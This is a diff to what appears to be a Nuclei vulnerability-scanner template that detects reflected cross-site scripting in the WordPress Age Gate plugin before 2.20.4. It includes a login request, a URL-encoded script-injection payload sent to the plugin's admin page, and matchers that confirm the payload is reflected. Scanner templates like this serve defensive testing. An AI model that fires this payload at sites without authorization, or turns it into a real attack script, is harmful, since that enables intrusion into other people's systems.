@@ -1,5 +1,4 @@
 id: age-gate-xss
-
 info:
   name: WordPress Age Gate <2.20.4 - Cross-Site Scripting
   author: akincibor,daffainfo
@@ -12,14 +11,28 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-80
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag authenticated
     max-request: 2
-  tags: xss,authenticated,age-gate,wpscan,wordpress,wp-plugin,wp,vuln
-
+  tags: age-gate,authenticated,vuln,wordpress,wp,wp-plugin,wpscan,xss
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        part: body
+        type: word
+        words:
+          - '"><script>alert(document.domain)</script>'
+          - Age Gate Restriction Settings
+      - part: header
+        type: word
+        words:
+          - text/html
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    raw:
       - |
         POST /wp-login.php HTTP/1.1
         Host: {{Hostname}}
@@ -29,22 +42,3 @@ http:
       - |
         GET /wp-admin/admin.php?page=age-gate&a%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
         Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - '"><script>alert(document.domain)</script>'
-          - 'Age Gate Restriction Settings'
-        condition: and
-
-      - type: word
-        part: header
-        words:
-          - text/html
-
-      - type: status
-        status:
-          - 200
-
